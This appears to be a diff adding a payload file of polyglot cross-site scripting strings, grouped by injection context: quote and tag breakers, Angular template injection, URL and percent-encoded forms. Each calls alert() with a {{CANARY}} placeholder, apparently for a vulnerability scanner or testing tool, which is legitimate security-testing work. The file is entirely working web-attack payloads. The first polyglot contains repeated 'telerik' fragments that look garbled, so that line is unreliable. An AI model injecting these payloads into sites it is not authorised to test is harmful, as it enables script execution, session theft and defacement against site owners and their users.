@@ -1,0 +1,45 @@
+# Polyglot XSS Payloads
+# Work across multiple contexts simultaneously
+
+# === Classic Polyglots ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('{{CANARY}}') )//%0telerik%0telerik%0telerik0telerik&telerik#telerik;alert('{{CANARY}}')//
+
+'">><marquee><img src=x onerror=alert('{{CANARY}}')>></marquee></plaintext\></|\><plaintext/onmouseover=alert('{{CANARY}}')>
+
+"><img src=x onerror="alert('{{CANARY}}')">'><img src=x onerror='alert("{{CANARY}}")'>
+
+# === Multi-Context Breakers ===
+';alert('{{CANARY}}');//
+";alert('{{CANARY}}');//
+\';alert('{{CANARY}}');//
+\";alert('{{CANARY}}');//
+</script><svg onload=alert('{{CANARY}}')>
+'-alert('{{CANARY}}')-'
+"-alert('{{CANARY}}')-"
+
+# === Script + Attribute + HTML Context ===
+"'><script>alert('{{CANARY}}')</script>
+"'><img src=x onerror=alert('{{CANARY}}')>
+"'><svg onload=alert('{{CANARY}}')>
+
+# === Angular + Standard Polyglots ===
+{{constructor.constructor('alert("{{CANARY}}")')()}}
+{{$on.constructor('alert("{{CANARY}}")')()}}
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+
+# === URL + HTML Polyglots ===
+javascript:/*</title></style></textarea></noscript></xmp></template></select>*/alert('{{CANARY}}')//
+
+# === Comment + Tag Breaker ===
+--></script></title></textarea></style></noscript></xmp></template></select><img src=x onerror=alert('{{CANARY}}')>
+
+# === Comprehensive Tag Escape ===
+</script></title></textarea></style></noscript></xmp></template></select></math></svg><img src=x onerror=alert('{{CANARY}}')>
+
+# === Mixed Quote Escape ===
+`'"><img src=x onerror=alert('{{CANARY}}')>
+`'"--><script>alert('{{CANARY}}')</script>
+
+# === Double Encoding Polyglot ===
+%22%3E%3Cscript%3Ealert('{{CANARY}}')%3C/script%3E
+%27%3E%3Cscript%3Ealert('{{CANARY}}')%3C/script%3E
